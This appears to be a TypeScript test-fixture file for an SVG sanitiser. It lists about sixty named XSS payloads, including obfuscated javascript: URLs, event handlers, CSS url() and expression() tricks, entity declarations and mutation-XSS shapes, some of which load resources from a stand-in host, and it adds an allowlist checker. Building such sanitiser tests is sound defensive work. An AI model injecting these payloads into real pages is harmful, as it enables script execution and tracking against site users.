import type { SvgElementNode, SvgNode } from '#diagrams/svg-sanitize.ts';

import {
  SVG_DATA_ATTRIBUTE,
  SVG_ELEMENTS,
  SVG_PLAIN_ATTRIBUTES,
  SVG_PRESENTATION_ATTRIBUTES,
  SVG_RASTER_DATA_URL,
  SVG_URL_ATTRIBUTES,
} from '#diagrams/svg-allowlist.ts';

/**
 * Known ways to run script or load something from an SVG, each as markup to sanitise: the
 * reviewer's reproductions first, then scripts in every casing and prefix, event handlers, script
 * and data URLs however they are hidden, external references, embedded documents, style sheets, CSS
 * functions and escapes, entity declarations and mutation-XSS shapes.
 */
export const SVG_ATTACKS: readonly (readonly [name: string, markup: string])[] = [
  [
    'a script rebuilt from the pieces a single pass leaves',
    '<svg><scr<script></script>ipt>alert(1)</scr<script></script>ipt></svg>',
  ],
  [
    'animate retargeting href to javascript:',
    '<svg><a href="#a"><animate attributeName="href" values="#a;javascript:alert(1)"/><text>x</text></a></svg>',
  ],
  [
    'set retargeting href to a tab-split javascript:',
    '<svg><a><set attributeName="href" to="java&Tab;script:alert(1)"/><text>x</text></a></svg>',
  ],
  [
    'animate retargeting xlink:href',
    '<svg><a xlink:href="#a"><animate attributeName="xlink:href" from="#a" to="javascript:alert(1)" begin="0s"/>x</a></svg>',
  ],
  [
    'animateMotion and animateTransform',
    '<svg><rect><animateMotion path="M0 0"/><animateTransform attributeName="transform"/></rect></svg>',
  ],
  ['script in uppercase', '<svg><SCRIPT>alert(1)</SCRIPT></svg>'],
  ['script in mixed case with a src', '<svg><ScRiPt src="https://evil.test/x.js"/></svg>'],
  ['script with the svg prefix', '<svg><svg:script>alert(1)</svg:script></svg>'],
  ['script with another prefix', '<svg><x:script>alert(1)</x:script></svg>'],
  [
    'script with an xlink:href data URL',
    '<svg><script xlink:href="data:text/javascript,alert(1)"/></svg>',
  ],
  ['onload on the root', '<svg onload="alert(1)"><rect/></svg>'],
  ['onload after a slash', '<svg/onload=alert(1)><rect/></svg>'],
  [
    'SMIL event handlers',
    '<svg><rect onbegin="alert(1)" onend="alert(2)" onrepeat="alert(3)" ONCLICK="alert(4)" onFocusIn="alert(5)"/></svg>',
  ],
  [
    'handlers on a nested svg',
    '<svg><svg onload="alert(1)" onanimationstart="alert(2)"><rect/></svg></svg>',
  ],
  ['javascript: in an a', '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>'],
  ['javascript: split by a tab', '<svg><a href="java\tscript:alert(1)"><text>x</text></a></svg>'],
  ['javascript: split by an entity tab', '<svg><a href="java&#9;script:alert(1)">x</a></svg>'],
  [
    'javascript: split by a newline entity',
    '<svg><a href="java&NewLine;script:alert(1)">x</a></svg>',
  ],
  ['javascript: with an encoded letter', '<svg><a href="&#106;avascript:alert(1)">x</a></svg>'],
  ['javascript: in uppercase after spaces', '<svg><a href="  JAVASCRIPT:alert(1)">x</a></svg>'],
  [
    'javascript: after a control character',
    '<svg><a xlink:href="\u0001javascript:alert(1)">x</a></svg>',
  ],
  ['vbscript:', '<svg><a href="vbscript:msgbox(1)">x</a></svg>'],
  ['a data: HTML link', '<svg><a href="data:text/html,<script>alert(1)</script>">x</a></svg>'],
  [
    'an image of a data: SVG',
    '<svg><image href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"/></svg>',
  ],
  ['a use of a data: SVG', '<svg><use href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=#x"/></svg>'],
  ['an image from the web', '<svg><image href="https://evil.test/track.png"/></svg>'],
  [
    'a use of an external file',
    '<svg><use xlink:href="https://evil.test/x.svg#a"/><use href="other.svg#a"/><use href="//evil.test/x#a"/></svg>',
  ],
  ['feImage from the web', '<svg><filter><feImage href="https://evil.test/x.png"/></filter></svg>'],
  [
    'foreignObject with HTML',
    '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe><img src=x onerror=alert(1)></foreignObject></svg>',
  ],
  [
    'iframe, embed and object',
    '<svg><iframe srcdoc="x"></iframe><embed src="x"/><object data="x"/></svg>',
  ],
  [
    'meta, link and base',
    '<svg><meta http-equiv="refresh" content="0;url=javascript:alert(1)"/><link rel="stylesheet" href="https://evil.test/x.css"/><base href="https://evil.test/"/></svg>',
  ],
  [
    'a style element with @import',
    '<svg><style>@import "https://evil.test/x.css";</style><rect/></svg>',
  ],
  [
    'a style element with url()',
    '<svg><style>rect { fill: url(https://evil.test/x) }</style></svg>',
  ],
  ['url(javascript:) in a fill', '<svg><rect fill="url(javascript:alert(1))"/></svg>'],
  ['an external url() in a fill', '<svg><rect fill="url(https://evil.test/p.svg#g)"/></svg>'],
  [
    'url(javascript:) in a style',
    '<svg><rect style="fill: red; background: url(javascript:alert(1))"/></svg>',
  ],
  ['expression() in a style', '<svg><rect style="width: expression(alert(1))"/></svg>'],
  ['expression() in a presentation attribute', '<svg><rect fill="expression(alert(1))"/></svg>'],
  ['a CSS escape spelling url', '<svg><rect style="fill: u\\72 l(https://evil.test/x)"/></svg>'],
  ['a CSS comment splitting url', '<svg><rect style="fill: u/**/rl(https://evil.test/x)"/></svg>'],
  [
    '-moz-binding and behavior',
    '<svg><rect style="-moz-binding: url(x.xml#a); behavior: url(x.htc)"/></svg>',
  ],
  [
    'a style that closes the attribute and the element',
    '<svg><rect style="fill:red;}</style><script>alert(1)</script>"/></svg>',
  ],
  [
    'an entity declaration holding a script',
    '<!DOCTYPE svg [<!ENTITY x "<script>alert(1)</script>">]><svg><text>&x;</text></svg>',
  ],
  [
    'an XML prologue and a processing instruction',
    '<?xml version="1.0"?><?xml-stylesheet href="https://evil.test/x.css"?><svg><rect/></svg>',
  ],
  ['a comment', '<svg><!-- <script>alert(1)</script> --><rect/></svg>'],
  ['CDATA holding markup', '<svg><text><![CDATA[<script>alert(1)</script>]]></text></svg>'],
  [
    'a style comment hiding an img (mutation XSS)',
    '<svg><style><!--</style><img src onerror=alert(1)>--></style></svg>',
  ],
  [
    'a p breaking out of the drawing',
    '<svg><p><style><img src onerror=alert(1)></style></p></svg>',
  ],
  [
    'a closing p before a style',
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>"></style></svg>',
  ],
  ['an img inside a title', '<svg><title><img src onerror=alert(1)></title></svg>'],
  [
    'a desc holding another drawing',
    '<svg><desc><svg><foreignObject><img src onerror=alert(1)></foreignObject></svg></desc></svg>',
  ],
  [
    'MathML around a style',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><svg/>',
  ],
  ['HTML before the drawing', '<img src=x onerror=alert(1)><svg><rect/></svg>'],
  [
    'escaped markup in text stays text',
    '<svg><text>&lt;script&gt;alert(1)&lt;/script&gt;</text></svg>',
  ],
  ['a target on a link', '<svg><a href="#x" target="_blank"><text>x</text></a></svg>'],
  ['unicode line separators', '<svg><text>a b c</text><rect id="a " fill="red "/></svg>'],
  [
    'quotes in values',
    `<svg><rect id='a"b' data-x="a fill='#e4572e'"/><text>fill="#e4572e"</text></svg>`,
  ],
];

/**
 * Allowed attribute names by lowercase name.
 */
const ATTRIBUTES: ReadonlySet<string> = new Set(
  [...SVG_PLAIN_ATTRIBUTES, ...SVG_PRESENTATION_ATTRIBUTES, ...SVG_URL_ATTRIBUTES, 'style'].map(
    (name) => name.toLowerCase(),
  ),
);

/**
 * Allowed element names by lowercase name.
 */
const ELEMENTS: ReadonlySet<string> = new Set(SVG_ELEMENTS.map((name) => name.toLowerCase()));

/**
 * Everything in a parsed tree that the allowlist does not allow, as phrases; empty for a clean
 * tree. Checks every element (SVG namespace, allow-listed name), every attribute (allow-listed
 * name, no handler, `href` only to a `#fragment` or a raster image) and every value (no script
 * scheme, however spaced, and no `url()` but to a `#fragment`).
 *
 * @param nodes - A parsed tree.
 */
export function disallowedIn(nodes: readonly SvgNode[]): string[] {
  const problems: string[] = [];
  for (const node of nodes) {
    if (node.type === 'element') {
      problems.push(...disallowedInElement(node));
    }
  }

  return problems;
}

/**
 * What {@link disallowedIn} finds in one element and its children.
 *
 * @param node - An element.
 */
function disallowedInElement(node: SvgElementNode): string[] {
  const problems: string[] = [];
  if (!node.svg || !ELEMENTS.has(node.name.toLowerCase())) {
    problems.push(`element ${node.name} (svg: ${String(node.svg)})`);
  }

  for (const { name, value } of node.attributes) {
    const lower = name.toLowerCase();
    // eslint-disable-next-line no-control-regex
    const compact = value.replace(/[\s\u0000-\u001f]+/g, '').toLowerCase();
    if (!ATTRIBUTES.has(lower) && !SVG_DATA_ATTRIBUTE.test(lower)) {
      problems.push(`attribute ${name} on ${node.name}`);
    }

    if (
      (lower === 'href' || lower === 'xlink:href') &&
      !value.startsWith('#') &&
      !SVG_RASTER_DATA_URL.test(value)
    ) {
      problems.push(`${name}="${value}" on ${node.name}`);
    }

    if (/(?:javascript|vbscript):/.test(compact) || /url\((?!['"]?#)/.test(compact)) {
      problems.push(`${name}="${value}" on ${node.name}`);
    }
  }

  return [...problems, ...disallowedIn(node.children)];
}
